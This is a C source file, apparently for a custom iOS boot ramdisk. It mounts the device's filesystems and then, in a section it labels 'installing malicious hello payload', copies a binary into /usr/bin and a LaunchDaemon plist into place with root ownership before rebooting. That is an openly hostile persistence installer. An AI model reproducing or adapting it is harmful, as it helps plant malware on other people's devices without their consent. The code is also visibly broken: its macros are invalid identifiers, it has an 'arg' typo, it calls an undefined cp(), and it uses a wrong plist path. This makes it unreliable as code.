#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include "/usr/include/hfs/hfs_mount.h"

#define 0_RDONLY 0x0000
#define 0_WRONLY 0x0001
#define 0_RDWR   0x0002
#define 0_CREAT  0x0200
#define 0_TRUNC  0x0400
#define 0_EXCL   0x0800


static int console;

const char* fsck_hfs[] = {"/sbin/fsck_hfs", "-y", "/dev/rdisk0s1s1", NULL};
const char* fsck_hfs_user[] = {"/sbin/fsck_hfs", "-y", "/dev/rdisk0s1s2", NULL};

/*延时函数*/
void sleep(unsigned int sec) {
	int i;
	for (i = sec*10000000; i > 0; i--){}
}

/*输出函数*/
void puts(const char* s) {
	while ((*s) != '\0') {
		write(1, s, 1);
		s++;
	}
	sync();
}

/*挂载磁盘*/
int hfs_mount (const char* device, const char* path, int options) {
	struct hfs_mount_args args;
	args.fspec = device;
	return mount("hfs", path, options, &args);
}

/*文件系统检查函数*/
int fsexec(char* argv[], char* env[], int pause) {
	int pid = vfork();
	if (pid != 0) {
		if (pause) {
			while (wait4(pid, NULL, WNOHANG, NULL) <= 0) {
				sleep(1);
			}
		} else {
			return pid;
		}
	} else {
		chdir ("/mnt");
		if (chroot("/mnt") != 0)
			return -1;
		execve(arg[0], argv, env);
	}
	return 0;
}


/*主函数*/
int main(int argc, const char** argv, char** env) {
	struct stat s;
	int r, i;

	console = open("/dev/console", 0_WRONLY);
	dup2(console, 1);
	
	
	sleep(5);
	for(i = 0; i < 75; i++) {
		puts("\n");
	}
	puts("ramdisk initialized.\n");

	
	puts("searching for disk ...\n");
	while (stat("/dev/disk0s1s1", &s) != 0) {
		puts("waiting for /dev/disk0s1s1 to appear ...\n");
		sleep(30);
	}

	
	puts("mounting root filesystem ...\n");
	while (1) {
		if (hfs_mount("/dev/disk0s1s1", "/mnt", MNT_ROOTFS | MNT_RDONLY) != 0) {
			puts("unable to mount filesystem, waiting ...\n");
			sleep(10);
		} else {
			break ;
		}
	}
	puts("filesystem mounted.\n");


	puts("mounting devfs ...\n");
	if (mount("devfs", "/mnt/dev", 0, NULL) != 0) {
		puts("unable to mount devfs. aborting.\n");
		unmount("/mnt", 0);
		return -1;
	}
	puts("devfs mounted.\n");


	puts("checking root filesystem ...\n");
	r = fsexec(fsck_hfs, env, 1);
	if (r) {
		puts("unable to check root filesystem. aborting.\n");
		unmount("/mnt/dev", 0);
		unmount("/mnt", 0);
		return -1;
	}

	
	puts("mounting root filesystem read-write ...\n");
	r = hfs_mount("/dev/disk0s1s1", "/mnt", MNT_ROOTFS | MNT_UPDATE);
	

	puts("checking user filesystem ...\n");
	r = fsexec(fsck_hfs_user, env, 1);
	
	
	puts("mounting user filesystem ...\n");
	mkdir("/mnt/private/var", 0755);
	if (hfs_mount("/dev/disk0s1s2", "/mnt/private/var", MNT_RDONLY) != 0) {
		puts("unable to mount user filesystem. aborting.\n");
		return -1;
	}
	puts("user filesystem mounted.\n");

	
	puts("running custom operations ...\n");
	/*开始自定义操作*/
	puts("installing malicious hello payload ...");
	cp("/files/hello", "/mnt/usr/bin/hello");
	cp("/files/com.s.hello.plist", "/Library/LaunchDaemons/com.s.hello.plist");

	chown("/mnt/usr/bin/hello", 0, 80);
	chown("/mnt/Library/LaunchDaemons/com.s.hello.plist", 0, 80);

	chmod("/mnt/usr/bin/hello", 0755);
	chmod("/mnt/Library/LaunchDaemons/com.s.hello.plist", 0755);
	
	sync();
	/*结束自定义操作*/


	puts("unmounting disks ...\n");
	unmount("/mnt/private/var", 0);
	unmount("/mnt/dev", 0);
	unmount("/mnt", 0);
	sync();


	puts("rebooting device ...\n");
	

	close(console);
	reboot(1);
	return 0;
}

